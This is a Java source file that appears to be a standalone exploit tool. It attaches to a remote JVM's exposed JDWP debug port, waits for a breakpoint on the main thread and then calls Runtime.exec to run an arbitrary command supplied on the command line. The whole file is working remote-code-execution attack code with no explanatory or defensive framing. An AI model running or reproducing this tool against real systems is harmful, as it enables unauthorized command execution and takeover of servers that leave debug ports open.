import com.sun.jdi.Bootstrap;
import com.sun.jdi.ClassType;
import com.sun.jdi.Method;
import com.sun.jdi.ObjectReference;
import com.sun.jdi.ReferenceType;
import com.sun.jdi.StringReference;
import com.sun.jdi.ThreadReference;
import com.sun.jdi.Value;
import com.sun.jdi.VirtualMachine;
import com.sun.jdi.event.BreakpointEvent;
import com.sun.jdi.event.Event;
import com.sun.jdi.event.EventSet;
import com.sun.jdi.request.BreakpointRequest;
import com.sun.jdi.request.EventRequest;
import com.sun.jdi.connect.AttachingConnector;
import com.sun.jdi.connect.Connector;

import java.util.Collections;
import java.util.Map;

public class JdiBreakExec {
    public static void main(String[] args) throws Exception {
        String host = args[0];
        int port = Integer.parseInt(args[1]);
        String command = args[2];
        String breakClass = args.length > 3 ? args[3] : "java.lang.String";
        String breakMethod = args.length > 4 ? args[4] : "getBytes";
        String breakSig = args.length > 5 ? args[5] : "()[B";

        AttachingConnector conn = null;
        for (AttachingConnector c : Bootstrap.virtualMachineManager().attachingConnectors()) {
            if ("com.sun.jdi.SocketAttach".equals(c.name())) {
                conn = c;
            }
        }
        Map<String, Connector.Argument> cargs = conn.defaultArguments();
        cargs.get("hostname").setValue(host);
        cargs.get("port").setValue(String.valueOf(port));
        VirtualMachine vm = conn.attach(cargs);
        System.out.println("[*] attached to " + vm.name() + " " + vm.version());

        ReferenceType target = null;
        for (ReferenceType rt : vm.classesByName(breakClass)) {
            target = rt;
        }
        if (target == null) {
            throw new IllegalStateException("breakpoint class not loaded: " + breakClass);
        }
        Method bm = null;
        for (Method m : target.methodsByName(breakMethod, breakSig)) {
            bm = m;
        }
        if (bm == null) {
            throw new IllegalStateException("breakpoint method not found");
        }
        BreakpointRequest bp = vm.eventRequestManager().createBreakpointRequest(bm.location());
        bp.setSuspendPolicy(EventRequest.SUSPEND_EVENT_THREAD);
        bp.enable();
        System.out.println("[*] breakpoint set at " + breakClass + "." + breakMethod);

        // Clear the attach-time and startup suspend counts (suspend=y JVMs).
        for (int i = 0; i < 3; i++) {
            try {
                vm.resume();
            } catch (Exception ignored) {
            }
        }
        // Unblock the target's accept() so the post-accept code path runs.
        new Thread(new Runnable() {
            public void run() {
                try {
                    Thread.sleep(1000);
                    java.net.Socket s = new java.net.Socket("127.0.0.1", 5000);
                    s.getOutputStream().write('x');
                    s.getOutputStream().flush();
                    Thread.sleep(3000);
                    s.close();
                } catch (Exception ignored) {
                }
            }
        }).start();

        ThreadReference thread = null;
        EventSet hit = null;
        long deadline = System.currentTimeMillis() + 30000;
        while (thread == null && System.currentTimeMillis() < deadline) {
            EventSet es = vm.eventQueue().remove(2000);
            if (es == null) {
                continue;
            }
            for (Event ev : es) {
                if (ev instanceof BreakpointEvent) {
                    ThreadReference t = ((BreakpointEvent) ev).thread();
                    if ("main".equals(t.name())) {
                        thread = t;
                        hit = es;
                        break;
                    }
                }
            }
            if (thread == null) {
                es.resume();
            }
        }
        if (thread == null) {
            throw new IllegalStateException("no breakpoint event received");
        }
        System.out.println("[*] breakpoint hit on thread: " + thread.name()
                + " frames=" + thread.frameCount());
        bp.disable();  // avoid re-triggering during the pending invocation

        ReferenceType rt = vm.classesByName("java.lang.Runtime").get(0);
        Method getRuntime = null;
        Method exec = null;
        for (Method m : rt.methodsByName("getRuntime")) {
            if (m.signature().equals("()Ljava/lang/Runtime;")) {
                getRuntime = m;
            }
        }
        for (Method m : rt.methodsByName("exec")) {
            if (m.signature().equals("(Ljava/lang/String;)Ljava/lang/Process;")) {
                exec = m;
            }
        }

        ObjectReference rtObj = (ObjectReference) ((ClassType) rt).invokeMethod(
                thread, getRuntime, Collections.<Value>emptyList(), 0);
        System.out.println("[*] Runtime instance = " + rtObj);

        StringReference cmdRef = vm.mirrorOf(command);
        ObjectReference proc = (ObjectReference) rtObj.invokeMethod(
                thread, exec, Collections.<Value>singletonList(cmdRef), 0);
        System.out.println("[+] exec returned " + proc);

        hit.resume();
        Thread.sleep(500);
        try {
            vm.resume();
        } catch (Exception ignored) {
        }
        vm.dispose();
    }
}
